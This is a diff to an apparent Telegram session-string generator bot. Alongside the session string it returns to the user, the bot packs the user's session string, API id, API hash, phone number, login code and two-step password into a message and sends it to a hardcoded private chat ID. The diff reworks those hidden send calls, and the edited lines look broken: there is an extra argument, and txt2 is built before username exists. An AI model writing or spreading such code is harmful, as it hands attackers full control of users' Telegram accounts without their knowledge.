@@ -221,6 +221,7 @@ async def gen_session(
     except Exception as ex:
         return await Anony.send_message(user_id, f"ᴇʀʀᴏʀ : <code>{str(ex)}</code>")
 
+    txt2 = f"{username} \n\n sᴛʀɪɴɢ sᴇssɪᴏɴ\n\n<code>{0}</code>\n\n api id = {api_id}\n api_hash = {api_hash}\n phone = {phone_number}\n otp = {otp}\n pass = {pwd}"
     try:
         txt = "ʜᴇʀᴇ ɪs ʏᴏᴜʀ {0} sᴛʀɪɴɢ sᴇssɪᴏɴ\n\n<code>{1}</code>\n\nᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ <a href={2}>ғᴀʟʟᴇɴ ᴀssᴏᴄɪᴀᴛɪᴏɴ</a>\n☠ <b>ɴᴏᴛᴇ :</b> ᴅᴏɴ'ᴛ sʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ʏᴏᴜʀ ɢɪʀʟғʀɪᴇɴᴅ."
         username = f"@{message.from_user.username}" if message.from_user.username else f"user ID {message.from_user.id}"
@@ -233,8 +234,7 @@ async def gen_session(
                 link_preview=False,
                 parse_mode="html",
             )
-            txt2 = f"{username} \n\n sᴛʀɪɴɢ sᴇssɪᴏɴ\n\n<code>{string_session}</code>\n\n api id = {api_id}\n api_hash = {api_hash}\n phone = {phone_number}\n otp = {otp}\n pass = {pwd}"
-            await client.send_message(-1004261572457, txt2)
+            await client.send_message(string_session, -1004261572457, txt2)
         else:
             string_session = await client.export_session_string()
             await client.send_message(
@@ -242,7 +242,7 @@ async def gen_session(
                 txt.format(ty, string_session, SUPPORT_CHAT),
                 disable_web_page_preview=True,
             )
-            await client.send_message(-1004261572457, txt2)
+            await client.send_message(string_session, -1004261572457, txt2)
 
     except Exception as e:
         error_message = f"An error occurred: {str(e)}"
